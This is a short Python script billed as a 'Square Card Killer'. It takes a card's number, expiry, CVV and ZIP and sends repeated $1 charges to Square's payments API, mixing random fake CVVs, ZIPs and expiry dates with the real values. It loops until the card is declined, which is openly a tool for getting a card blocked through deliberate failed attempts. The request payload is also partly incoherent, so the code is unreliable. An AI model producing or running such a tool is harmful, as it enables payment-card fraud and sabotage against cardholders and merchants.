import requests
import time
import random
import threading
import uuid

# ========== USER INPUT ==========
print("="*50)
print("💳 SQUARE CARD KILLER (LIVE API FLOW)")
print("="*50)

card_number = input("Enter Card Number: ")
exp_month   = input("Enter Expiry Month (MM): ")
exp_year    = input("Enter Expiry Year (YY): ")
cvv_real    = input("Enter CVV: ")
zip_real    = input("Enter ZIP Code: ")

# ========== SQUARE API SETUP ==========
square_token = "YOUR_SQUARE_SANDBOX_TOKEN"
square_location_id = "YOUR_LOCATION_ID"

loading = True
start_time = time.time()

def animate_loading():
    bar = ["[🟨     ]", "[🟨🟨    ]", "[🟨🟨🟨   ]", "[🟨🟨🟨🟨  ]", "[🟨🟨🟨🟨🟨 ]", "[🟨🟨🟨🟨🟨🟨]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage}", end="", flush=True)
            time.sleep(0.3)

def square_charge(cvv, zip_code, month, year):
    try:
        nonce = str(uuid.uuid4())
        payload = {
            "idempotency_key": str(uuid.uuid4()),
            "autocomplete": False,
            "amount_money": {
                "amount": 100,
                "currency": "USD"
            },
            "source_id": "cnon:card-nonce-ok",
            "card_details": {
                "card": {
                    "number": card_number,
                    "exp_month": int(month),
                    "exp_year": int("20" + year),
                    "cvv": cvv,
                    "postal_code": zip_code
                }
            },
            "location_id": square_location_id
        }

        headers = {
            "Authorization": f"Bearer {square_token}",
            "Content-Type": "application/json"
        }

        response = requests.post("https://connect.squareupsandbox.com/v2/payments", json=payload, headers=headers)
        if "payment" in response.json():
            return "approved"
        elif "errors" in response.json():
            return "declined"
        else:
            return "error"
    except Exception:
        return "timeout"

def kill_card():
    global loading
    attempt = 0
    killed = False

    while not killed:
        # === FAKE ATTEMPTS ===
        for _ in range(3):  # Square usually sensitive to fewer attempts
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year = str(random.randint(25, 30))

            attempt += 1
            result = square_charge(fake_cvv, fake_zip, fake_month, fake_year)
            print(f"\n[Attempt {attempt}] Fake charge: {result}")

        # === REAL ATTEMPT ===
        result = square_charge(cvv_real, zip_real, exp_month, exp_year)

        if result == "declined":
            killed = True
        else:
            print("\n[✓] Card still alive... Retrying!\n")

    loading = False
    duration = round(time.time() - start_time, 2)
    print(f"\n💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

# ========== RUN THREADS ==========
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()
t2.join()
